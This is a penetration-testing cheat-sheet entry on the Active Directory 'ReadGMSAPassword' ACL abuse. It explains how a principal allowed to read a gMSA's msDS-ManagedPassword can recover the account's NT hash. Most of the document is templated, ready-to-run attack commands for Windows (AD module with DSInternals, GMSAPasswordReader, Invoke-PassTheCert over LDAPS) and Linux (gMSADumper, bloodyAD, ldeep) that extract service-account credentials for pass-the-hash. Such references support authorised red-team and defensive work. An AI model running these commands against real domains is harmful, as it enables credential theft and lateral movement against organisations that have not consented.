---
technique: ReadGMSAPassword
category: acl-abuse
ace: msDS-GroupMSAMembership
targets: gMSA
protocols: LDAP, LDAPS
remote_capable: true
tags: acl-abuse dacl ad gmsa managed-service-account ldap credential-access
---

# ReadGMSAPassword

This abuse applies when a controlled object is listed in the target gMSA's `msDS-GroupMSAMembership` DACL as an allowed reader, granting it the right to retrieve the `msDS-ManagedPassword` attribute. The attacker can decode the returned blob to recover the gMSA's NT hash, which can then be used for pass-the-hash or Kerberos authentication as the service account.

## Required ACEs

| ACE | What it grants |
|-----|----------------|
| Listed in msDS-GroupMSAMembership | Right to read the msDS-ManagedPassword blob for the gMSA |

## Windows

The AD and DSInternals PowerShell modules are the primary path. GMSAPasswordReader (C#) and Invoke-PassTheCert cover alternative scenarios.

### Step 1: Retrieve gMSA object (AD module)

#powershell #rsat #dsinternals

Fetch the gMSA account with its msDS-ManagedPassword attribute using the Active Directory PowerShell module.

```powershell title:"Fetch gMSA object via AD module"
$gmsa = Get-ADServiceAccount -Identity "$target_user" -Properties 'msDS-ManagedPassword'
```
<!-- cheat
var target_user
-->

### Step 2: Store managed password blob (AD module)

#powershell #rsat #dsinternals

Store the returned msDS-ManagedPassword blob for DSInternals decoding.

```powershell title:"Store gMSA managed password blob"
$mp = $gmsa.'msDS-ManagedPassword'
```
<!-- cheat
-->

### Step 3: Decode blob and extract NT hash (DSInternals)

#powershell #rsat #dsinternals

Decode the gMSA managed password blob and convert the current password to an NT hash using DSInternals.

```powershell title:"Decode gMSA blob and extract NT hash via DSInternals"
(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NTHash
```
<!-- cheat
-->

### GMSAPasswordReader

#csharp #binary

Read and display the NT hash of a gMSA account using GMSAPasswordReader.

```powershell title:"Read gMSA NT hash with GMSAPasswordReader"
.\GMSAPasswordReader.exe --AccountName "$target_user"
```
<!-- cheat
var target_user
-->

### Step 3: Import module (Invoke-PassTheCert)

#powershell #certificate #ldaps

Import the Invoke-PassTheCert PowerShell module.

```powershell title:"Import Invoke-PassTheCert module"
Import-Module .\Invoke-PassTheCert.ps1
```
<!-- cheat -->

### Step 4: Get LDAP connection (Invoke-PassTheCert)

#powershell #certificate #ldaps

Establish an LDAPS connection using a certificate via Invoke-PassTheCert.

```powershell title:"Get LDAP connection instance via certificate"
$ldap = Invoke-PassTheCert-GetLDAPConnectionInstance -Server "$rhost_ip" -Port 636 -Certificate cert.pfx
```
<!-- cheat
import domain_ip
-->

### Step 5: Read gMSA password over LDAPS (Invoke-PassTheCert)

#powershell #certificate #ldaps

Read gMSA managed password attributes over LDAPS using a certificate via Invoke-PassTheCert.

```powershell title:"Read gMSA password over LDAPS using certificate"
Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $ldap -Enum 'gMSA' -Object "$target_gmsa_dn"
```
<!-- cheat
var target_gmsa_dn
-->

## Linux

gMSADumper is the primary tool; bloodyAD and ldeep are alternatives.

### gMSADumper

#ldap #password #python

Dump and decode gMSA passwords in one step using gMSADumper, which supports password and hash auth.

```sh title:"Dump gMSA passwords via gMSADumper"
gMSADumper.py -u "$user" -p "$pass" -d "$domain"
```
<!-- cheat
import domain_ip
import users
import passwords
-->

### bloodyAD

#ldap #multi-auth

Read the raw `msDS-ManagedPassword` blob from a gMSA using bloodyAD, which auto-decodes to NT hash.

```sh title:"Read gMSA msDS-ManagedPassword via bloodyAD"
bloodyAD --host "$rhost_name" -d "$domain" -u "$user" $auth_flags get object "$target_user" --attr msDS-ManagedPassword
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
-->

### ldeep

#ldap #password

Retrieve gMSA password information using ldeep's built-in gmsa subcommand.

```sh title:"Read gMSA password via ldeep"
ldeep ldap -d "$domain" -s "$rhost_ip" -u "$user" -p "$pass" gmsa -t "$target_user"
```
<!-- cheat
import domain_ip
import users
import passwords
var target_user
-->
